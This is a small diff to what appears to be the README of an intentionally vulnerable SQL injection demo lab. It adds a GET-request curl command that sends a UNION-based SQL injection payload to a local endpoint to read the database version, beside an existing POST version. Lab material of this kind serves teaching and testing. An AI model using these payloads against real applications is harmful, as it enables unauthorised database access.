@@ -11,4 +11,5 @@ sudo docker exec -ti victim.sqli.webapp_java_spring.tld mysql --host localhost -
 
 ```
 curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- "
+curl -X GET localhost:5808/sqlidemo/vulnbyid\?id="1'+UNION+SELECT+NULL,NULL,(SELECT+@@VERSION)+--+"
 ```
